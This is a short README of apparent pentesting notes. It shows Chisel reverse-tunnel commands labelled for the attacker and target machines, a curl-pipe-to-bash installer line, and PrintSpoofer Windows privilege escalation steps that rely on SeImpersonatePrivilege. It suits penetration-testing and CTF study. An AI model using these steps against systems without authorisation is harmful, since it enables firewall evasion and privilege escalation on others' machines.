# Hack_Scripts

The Scripts for Hacking and general ,
Includes python2  and Java
  --> Java
  --> Python
  --> Php

# CHISEL

Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.

See the latest release or download and install it now with curl https://i.jpillora.com/chisel! | bash

### Usage

$ chisel --help
  Usage: chisel [command] [--help]
  
  Version: X.Y.Z
  
  Commands:
  - server - runs chisel in server mode.
  - client - runs chisel in client mode.
    
  Read more:
  https://github.com/jpillora/chisel
    
`chisel server -p 9000 --reverse -v`   >> Run in Attacker Machine  
`chisel client <attacker ip:port{differnt port}> R:<attacker ip:port{different port1}>:<localhost:port{running port, need to be forwarded}>`   >> Run in Target Machine
 

# PrinterSpoofer

https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/  

Windows privilege escalation, To achive this check for **Privilages Information** by 
`whoami /priv'  

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
**SeImpersonatePrivilege        Impersonate a client after authentication Enabled**
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled  

***SeImpersonatePrivilege*** need to be **Enabled**

## Command for escaltion
`PrinterSpoofer.exe -i -c cmd`
